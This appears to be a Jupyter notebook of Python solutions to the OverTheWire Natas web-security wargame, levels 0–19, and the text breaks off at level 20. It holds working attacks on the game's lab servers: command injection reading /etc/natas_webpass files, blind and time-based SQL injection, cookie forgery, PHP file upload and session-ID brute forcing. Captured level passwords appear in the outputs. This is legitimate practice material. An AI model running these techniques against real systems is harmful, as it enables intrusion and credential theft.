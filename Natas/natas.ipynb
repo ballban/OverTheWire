{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import yaml\n",
    "import re\n",
    "import base64\n",
    "import urllib.parse\n",
    "from IPython.display import clear_output, HTML\n",
    "import threading\n",
    "import time\n",
    "\n",
    "pwd = None\n",
    "count = 0\n",
    "natas = auth = url = None\n",
    "ALPHANUMERIC_CHARACTERS = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\n",
    "\n",
    "def get_pwd():\n",
    "    global pwd\n",
    "    with open('password.yml', 'r') as f:\n",
    "        pwd = yaml.safe_load(f)\n",
    "\n",
    "def save_pwd(id, pw):\n",
    "    global pwd\n",
    "    with open('password.yml', 'w') as f:\n",
    "        pwd[id] = pw\n",
    "        yaml.dump(pwd, f)\n",
    "\n",
    "def find_pwd(res):\n",
    "    global count\n",
    "    pattern = r'[\\w\\d]{32}'\n",
    "    mat = re.findall(pattern, res.text)\n",
    "    natas = f'natas{count}'\n",
    "    if mat:\n",
    "        for m in mat:\n",
    "            if m != pwd[natas]:\n",
    "                print(f'password found: {m}')\n",
    "                save_pwd(f'natas{count + 1}', m)\n",
    "                return True\n",
    "    \n",
    "    print(f'password not found.')\n",
    "    print(res.text)\n",
    "    return False\n",
    "\n",
    "def run_task(task, count=5):\n",
    "    thread_list = []\n",
    "    for _ in range(count):\n",
    "        thread_list.append(threading.Thread(target=task))\n",
    "    for thread in thread_list:\n",
    "        thread.start()\n",
    "    for thread in thread_list:\n",
    "        thread.join()\n",
    "\n",
    "def init():\n",
    "    global count, natas, auth, url\n",
    "    get_pwd()\n",
    "    natas = f'natas{count}'\n",
    "    auth = (natas, pwd[natas])\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas0\n",
    "count = 0\n",
    "init()\n",
    "\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fTguMNxKo1DSa1tujBLuZJnDUlCcUAPlI\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas1\n",
    "count = 1\n",
    "init()\n",
    "\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas2\n",
    "count = 2\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/files/users.txt'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fQryZXc2e0zahULdHrtHxzyYkj59kUxLQ\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas3\n",
    "count = 3\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/s3cr3t/users.txt'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0n35PkggAPm2zbEpOU802c0x0Msn1ToK\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas4\n",
    "count = 4\n",
    "init()\n",
    "\n",
    "header = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), headers=header)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0RoJwHdSKWFTYR5WuiAewauSuNaBXned\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas5\n",
    "count = 5\n",
    "init()\n",
    "\n",
    "cookies = {'loggedin': '1'}\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas6"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<?\n",
      "$secret = \"FOEIUWGHFEEUHOFUOIU\";\n",
      "?>\n",
      "\n",
      "password found: fbmg8SvU1LizuWjx3y7xkNERkHxGre0GS\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas6\n",
    "count = 6\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/includes/secret.inc'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "print(res.text)\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "data = {\"secret\": \"FOEIUWGHFEEUHOFUOIU\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), data=data)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fxcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas7\n",
    "count = 7\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas8"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "secret: oubWYf2kBq\n",
      "password found: fZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas8\n",
    "count = 8\n",
    "\n",
    "encodedSecret = \"3d3d516343746d4d6d6c315669563362\"\n",
    "secret = base64.decodebytes(bytes.fromhex(encodedSecret)[::-1]).decode()\n",
    "print(f'secret: {secret}')\n",
    "\n",
    "init()\n",
    "data = {'secret': secret, 'submit': 'submit'}\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), data=data)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas9"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: ft7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas9\n",
    "count = 9\n",
    "\n",
    "#1 dictionary.txt; find / -type d -name \"natas*\";\n",
    "#1 dictionary.txt; ls /etc/natas_webpass;\n",
    "#1 dictionary.txt; cat /etc/natas_webpass/natas10;\n",
    "needle = \"1 dictionary.txt; cat /etc/natas_webpass/natas10;\"\n",
    "\n",
    "init()\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?needle={urllib.parse.quote(needle)}'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas10"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fUJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas10\n",
    "count = 10\n",
    "needle = \" -e '.' /etc/natas_webpass/* #\"\n",
    "\n",
    "init()\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?needle={urllib.parse.quote(needle)}'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas11"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'data': 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D'}\n",
      "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=\n",
      "a: b'\\x1ef$\\x07\\n3\\'\\x0e\\x167 \\x00\\x17 uUG*8MIf5\\x08\\x06+;\\x00\\x17fmMF\"1\\t\\x03\"1M\\x18'\n",
      "b: b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\n",
      "key: [101, 68, 87, 111]\n",
      "cookie: [30, 102, 36, 7, 10, 51, 39, 14, 22, 55, 32, 0, 23, 32, 117, 85, 71, 61, 50, 28, 71, 104, 117, 13, 2, 39, 56, 3, 10, 54, 117, 85, 71, 103, 49, 9, 3, 34, 49, 9, 71, 57]\n",
      "{'data': 'HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5'}\n",
      "password found: fyZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas11\n",
    "count = 11\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "cookies = {}\n",
    "for cookie in res.cookies:\n",
    "    cookies[cookie.name] = cookie.value\n",
    "print(cookies)\n",
    "\n",
    "a = urllib.parse.unquote(cookies['data'])\n",
    "print(a)\n",
    "a = base64.b64decode(a)\n",
    "b = b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\n",
    "print(f'a: {a}')\n",
    "print(f'b: {b}')\n",
    "\n",
    "key = []\n",
    "for i in range(len(b)):\n",
    "    key += [b[i] ^ a[i]]\n",
    "key = key[:4]\n",
    "print(f'key: {key}')\n",
    "\n",
    "text = b'{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}'\n",
    "cookie = []\n",
    "for i in range(len(text)):\n",
    "    cookie += [text[i] ^ key[i % len(key)]]\n",
    "print(f\"cookie: {cookie}\")\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "cookies['data'] = base64.b64encode(bytes(cookie)).decode()\n",
    "print(cookies)\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas12"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: ftrbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC\n"
     ]
    }
   ],
   "source": [
    "# natas12\n",
    "count = 12\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "files = {\"uploadedfile\": ('natas12.php', open('natas12.php', 'rb'), 'multipart/form-data')}\n",
    "data = {\"filename\": \"1.php\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), files=files, data=data)\n",
    "\n",
    "pattern = r'upload\\/[\\w\\d]{10}\\.php'\n",
    "mat = re.findall(pattern, res.text)\n",
    "if mat:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/{mat[0]}'\n",
    "    res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    find_pwd(res)\n",
    "else:\n",
    "    print('not found.')\n",
    "    print(res.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas13"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fz3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ\n"
     ]
    }
   ],
   "source": [
    "# natas13\n",
    "count = 13\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "files = {\"uploadedfile\": ('natas13.php', open('natas13.php', 'rb'), 'multipart/form-data')}\n",
    "data = {\"filename\": \"1.php\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), files=files, data=data)\n",
    "\n",
    "pattern = r'upload\\/[\\w\\d]{10}\\.php'\n",
    "mat = re.findall(pattern, res.text)\n",
    "if mat:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/{mat[0]}'\n",
    "    res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    find_pwd(res)\n",
    "else:\n",
    "    print('not found.')\n",
    "    print(res.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas14"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fSdqIqBsFcz3yotlNYErZSZwblkm0lrvx\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas14\n",
    "count = 14\n",
    "init()\n",
    "\n",
    "username = 'natas15\";#'\n",
    "password = \"123\"\n",
    "url = f'http://{natas}.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}&debug=0'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas15"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n",
      "--------------------------------------------------\n",
      "--------------------------------------------------\n",
      "password found: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "# natas15\n",
    "count = 15\n",
    "init()\n",
    "\n",
    "def try_inject(username):\n",
    "    url = f\"http://{natas}.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&debug=0\"\n",
    "    result = requests.get(url, auth=(natas, pwd[natas])).text\n",
    "    return \"This user exists.\" in result\n",
    "\n",
    "username = 'natas16\" and BINARY password like \"'\n",
    "password = \"\"\n",
    "\n",
    "current_char_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "def task():\n",
    "    global current_char_list, password\n",
    "    while len(password) < 32:\n",
    "        c = current_char_list.pop()\n",
    "        print(f\"trying {password}{c}\")\n",
    "        if try_inject(f\"{username}{password}{c}%\"):\n",
    "            clear_output()\n",
    "            password += c\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {password}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_char_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "run_task(task)\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {password}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas16\", password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas16"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bhjkoqsvwCEFHJLNOT05789\n"
     ]
    }
   ],
   "source": [
    "#natas16\n",
    "count = 16\n",
    "init()\n",
    "\n",
    "# get all characters in the password\n",
    "key_list = []\n",
    "for c in ALPHANUMERIC_CHARACTERS:\n",
    "    command = \"$(grep -oh {0} /etc/natas_webpass/natas17)\".format(c)\n",
    "    url = f\"http://{natas}.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "    response = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    if len(response.text) != 461926:\n",
    "        print(c, len(response.text))\n",
    "        key_list.append(c)\n",
    "\n",
    "key_list = \"\".join(key_list)\n",
    "clear_output()\n",
    "print(key_list)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\n",
      "--------------------------------------------------\n",
      "--------------------------------------------------\n",
      "password found: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\n",
      "--------------------------------------------------\n"
     ]
    },
    {
     "ename": "NameError",
     "evalue": "name 'password' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[3], line 29\u001b[0m\n\u001b[0;32m     27\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mpassword found: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mkey\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m)\n\u001b[0;32m     28\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m-\u001b[39m\u001b[38;5;124m\"\u001b[39m \u001b[38;5;241m*\u001b[39m \u001b[38;5;241m50\u001b[39m)\n\u001b[1;32m---> 29\u001b[0m save_pwd(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mnatas17\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[43mpassword\u001b[49m)\n",
      "\u001b[1;31mNameError\u001b[0m: name 'password' is not defined"
     ]
    }
   ],
   "source": [
    "# get all characters in the password\n",
    "key = \"\"\n",
    "current_key_list = [x for x in key_list]\n",
    "\n",
    "def task():\n",
    "    global key, current_key_list\n",
    "    while len(key) < 32:\n",
    "        if len(current_key_list) == 0:\n",
    "            return\n",
    "        c = current_key_list.pop()\n",
    "        new_key = key + c\n",
    "        print(f\"trying: {new_key}\")\n",
    "        command = \"$(grep -oh ^{0} /etc/natas_webpass/natas17)\".format(new_key)\n",
    "        url = f\"http://{natas}.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "        response = requests.get(url, auth=(natas, pwd[natas]))\n",
    "        if len(response.text) != 461926:\n",
    "            clear_output()\n",
    "            key = new_key\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {key}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_key_list = [x for x in key_list]\n",
    "\n",
    "run_task(task)\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {key}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas17\", key)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas17"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\n",
      "--------------------------------------------------\n",
      "Response time: 0.581000566482544\n",
      "Response time: 0.5825009346008301\n",
      "trying 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ9\n",
      "trying 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ8\n",
      "Response time: 0.5855011940002441\n",
      "Response time: 0.6174988746643066\n",
      "--------------------------------------------------\n",
      "password found: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "#natas17\n",
    "count = 17\n",
    "init()\n",
    "\n",
    "def try_inject(sql):\n",
    "    # print(sql)\n",
    "    t1 = time.time()\n",
    "    url = f\"http://natas17.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(sql)}&debug=0\"\n",
    "    result = requests.get(url, auth=(natas, pwd[natas])).text\n",
    "    t2 = time.time() - t1\n",
    "    print(f\"Response time: {t2}\")\n",
    "    if t2 > 5:\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "\n",
    "sql = \"natas18\\\" and BINARY password like \\\"{0}{1}%\\\" AND SLEEP(5)=0 #\"\n",
    "password = \"\"\n",
    "current_key_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "def task():\n",
    "    global password, current_key_list\n",
    "    while len(password) < 32:\n",
    "        if len(current_key_list) == 0:\n",
    "            time.sleep(6)\n",
    "            if len(current_key_list) == 0:\n",
    "                return\n",
    "        c = current_key_list.pop()\n",
    "        print(f\"trying {password}{c}\")\n",
    "        if try_inject(sql.format(password, c)):\n",
    "            clear_output()\n",
    "            password += c\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {password}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_key_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "run_task(task)\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {password}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas18\", password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas18"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1051\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas18\", \"pass\": \"6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\" };</script></head>\n",
      "<body>\n",
      "<h1>natas18</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19\n",
      "Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: ftnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\n"
     ]
    }
   ],
   "source": [
    "#natas18\n",
    "count = 18\n",
    "init()\n",
    "\n",
    "url = f'http://natas18.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=test'\n",
    "\n",
    "i = -1\n",
    "def task():\n",
    "    global i\n",
    "    while 'natas19' not in pwd:\n",
    "        i += 1\n",
    "        print(f'testing session id {i}')\n",
    "        cookies = dict(PHPSESSID=str(i))\n",
    "        result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "        if 'Username: natas19' in result.text:\n",
    "            clear_output()\n",
    "            print(len(result.text))\n",
    "            print(result.text)\n",
    "            find_pwd(result)\n",
    "            break\n",
    "\n",
    "run_task(task)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas19"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found. session id: 285, key: 3238312d61646d696e\n",
      "1097\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas19\", \"pass\": \"tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\" };</script></head>\n",
      "<body>\n",
      "<h1>natas19</h1>\n",
      "<div id=\"content\">\n",
      "<p>\n",
      "<b>\n",
      "This page uses mostly the same code as the previous level, but session IDs are no longer sequential...\n",
      "</b>\n",
      "</p>\n",
      "DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20\n",
      "Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: fp5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\n",
      "testing session id 285, key: 3238322d61646d696e\n",
      "testing session id 285, key: 3238332d61646d696e\n",
      "testing session id 285, key: 3238352d61646d696e\n",
      "testing session id 285, key: 3238342d61646d696e\n"
     ]
    }
   ],
   "source": [
    "#natas19\n",
    "count = 19\n",
    "init()\n",
    "\n",
    "url = f'http://natas19.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=test'\n",
    "i = -1\n",
    "def task():\n",
    "    global i\n",
    "    while 'natas20' not in pwd:\n",
    "        i += 1\n",
    "        key = f'{i}-admin'.encode('utf-8').hex()\n",
    "        cookies = dict(PHPSESSID=key)\n",
    "        result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "        if 'Username: natas20' in result.text:\n",
    "            clear_output()\n",
    "            print(f'password found. session id: {i}, key: {key}')\n",
    "            print(len(result.text))\n",
    "            print(result.text)\n",
    "            find_pwd(result)\n",
    "            break\n",
    "        print(f'testing session id {i}, key: {key}')\n",
    "\n",
    "run_task(task)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas20"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
